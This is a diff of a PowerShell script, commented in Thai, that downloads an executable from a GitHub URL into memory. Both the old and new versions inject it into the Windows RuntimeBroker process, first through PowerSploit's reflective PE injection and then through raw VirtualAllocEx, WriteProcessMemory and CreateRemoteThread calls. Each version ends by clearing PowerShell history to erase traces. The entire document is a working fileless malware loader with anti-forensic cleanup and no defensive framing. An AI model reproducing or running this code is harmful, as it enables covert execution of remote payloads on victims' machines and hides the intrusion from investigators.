@@ -1,44 +1,48 @@
-# --- 1. ตั้งค่าเป้าหมาย ---
-$payloadUrl = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
-$loaderUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
-$targetName = "RuntimeBroker"
+# --- 1. ตั้งค่า URL ของไฟล์ C++ EXE ---
+$url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
 
-# --- 2. ฟังก์ชันทำความสะอาด (Clean Up) ---
-function Cleanup-Traces {
-    Write-Host "[*] Cleaning up history and traces..." -ForegroundColor Magenta
-    $historyPath = (Get-PSReadlineOption).HistorySavePath
-    if (Test-Path $historyPath) { Clear-Content $historyPath }
-    Clear-History
-}
+# --- 2. ฟังก์ชันสำหรับเรียกใช้ Win32 API (เพื่อให้รองรับ Native Code) ---
+$Kernel32 = Add-Type -MemberDefinition @"
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+"@ -Name "Win32" -Namespace Win32Functions -PassThru
 
 try {
-    # --- 3. โหลดสคริปต์ Injection และ Payload เข้า RAM ---
-    Write-Host "[*] Downloading components to memory..." -ForegroundColor Cyan
-    $webClient = New-Object System.Net.WebClient
-    $loaderScript = $webClient.DownloadString($loaderUrl)
-    $exeBytes = $webClient.DownloadData($payloadUrl)
-    
-    # รันสคริปต์ Loader ใน Memory
-    Invoke-Expression $loaderScript
+    Write-Host "[*] Downloading C++ Payload to RAM..." -ForegroundColor Cyan
+    $bin = (New-Object System.Net.WebClient).DownloadData($url)
 
-    # --- 4. หา Process เป้าหมายและทำการ Inject ---
-    $targetProc = Get-Process -Name $targetName -ErrorAction SilentlyContinue | Select-Object -First 1
+    # 3. ค้นหา RuntimeBroker
+    $target = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+    if ($null -eq $target) { throw "Target process not found." }
+
+    $hProcess = [Win32Functions.Win32]::OpenProcess(0x1F0FFF, $false, $target.Id)
     
-    if ($null -ne $targetProc) {
-        Write-Host "[*] Injecting into $($targetName) (PID: $($targetProc.Id))..." -ForegroundColor Green
-        Invoke-ReflectivePEInjection -PEBytes $exeBytes -ProcId $targetProc.Id
-    } else {
-        Write-Host "[!] Target process not found. Running locally in memory..." -ForegroundColor Yellow
-        Invoke-ReflectivePEInjection -PEBytes $exeBytes
-    }
-}
-catch {
-    Write-Host "[!] An error occurred: $_" -ForegroundColor Red
-}
-finally {
-    # --- 5. ลบประวัติและปิดหน้าต่าง ---
-    Cleanup-Traces
-    Write-Host "[+] Task complete. Exiting..." -ForegroundColor Gray
+    # 4. จองพื้นที่และเขียน Code ลงใน RAM ของ RuntimeBroker
+    Write-Host "[*] Allocating memory in PID: $($target.Id)" -ForegroundColor Yellow
+    $addr = [Win32Functions.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint]$bin.Length, 0x3000, 0x40) # PAGE_EXECUTE_READWRITE
+    
+    $written = 0
+    [Win32Functions.Win32]::WriteProcessMemory($hProcess, $addr, $bin, [uint]$bin.Length, [ref]$written)
+
+    # 5. สั่งให้ Code ทำงาน
+    Write-Host "[*] Executing thread..." -ForegroundColor Green
+    [Win32Functions.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+
+} catch {
+    Write-Host "[!] Error: $_" -ForegroundColor Red
+} finally {
+    # --- 6. ลบประวัติร่องรอยทั้งหมด ---
+    Write-Host "[*] Cleaning up history..." -ForegroundColor Magenta
+    $hPath = (Get-PSReadlineOption).HistorySavePath
+    if (Test-Path $hPath) { Clear-Content $hPath }
+    Clear-History
+    Write-Host "[+] Complete. Exiting..."
     Start-Sleep -Seconds 2
     exit
 }
